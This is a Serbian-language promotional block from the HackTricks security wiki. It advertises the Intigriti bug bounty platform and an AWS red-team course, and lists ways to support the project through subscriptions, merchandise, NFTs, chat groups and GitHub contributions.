**Savet za bug bounty**: **prijavite se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
